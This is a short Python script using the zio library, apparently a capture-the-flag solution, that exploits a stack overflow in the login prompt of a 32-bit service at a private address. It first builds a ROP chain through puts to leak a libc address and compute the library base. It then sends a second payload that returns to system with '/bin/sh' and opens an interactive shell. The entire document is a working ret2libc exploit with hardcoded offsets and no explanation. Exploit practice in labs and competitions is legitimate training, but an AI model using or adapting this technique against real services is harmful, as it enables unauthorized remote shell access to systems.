from zio import *

host = '192.168.1.104'
port = 2333

system = 0x3e360
bin_sh = 0x15d1a9
puts_off = 0x64d20

login   = 0x8048a0b
put_plt = 0x80485b0
put_got = 0x804a894
bss	= 0x804aa00
target = (host,port)
io = zio(target)
#raw_input()
io.read_until(':')
io.writeline('1')
io.read_until(':')
# leak libc base
payload  = ''
payload += 'student_'
payload += 'a'*0x10
payload += l32(bss)
payload += l32(put_plt)
payload += l32(login)
payload += l32(put_got)
io.writeline(payload)
io.read_until(':')
io.writeline('000001')
io.read_until('00\'\n')
#io.writeline('1111')
#io.read_until('\n')
libc_base = l32(io.read(4)) - puts_off

print hex(libc_base)
#io.interact()
#io.read_until(':')
#io.writeline('1')
io.read_until(':')
# ret to system
payload  = ''
payload += 'student_'
payload += 'a'*0x10
payload += l32(bss)
payload += l32(libc_base + system)
payload += l32(login)
payload += l32(libc_base + bin_sh)
io.writeline(payload)
io.read_until(':')
io.writeline('000001')
io.read_until('00\'\n')
io.interact()
